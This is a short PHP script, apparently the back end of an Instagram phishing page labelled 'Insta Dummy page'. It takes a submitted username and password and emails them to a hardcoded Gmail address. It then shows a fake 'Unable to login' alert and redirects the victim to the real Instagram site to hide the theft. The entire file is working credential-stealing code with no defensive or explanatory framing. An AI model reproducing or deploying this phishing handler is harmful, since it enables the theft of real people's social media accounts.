<?php
    // Variable settings
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    $subject = "Someone Login ! Insta Dummy page";
    $to = "riotenation@gmail.com";
    $txt = "Username: " . $username . "\r\nPassword: " . $password;

    // Check input fields
    if (!empty($username) and !empty($password)) {
        mail($to, $subject, $txt);
        echo "<script type='text/javascript'>alert('Error ! Unable to login ');
            window.location.replace('https://www.instagram.com');
            </script>";
    }
?>
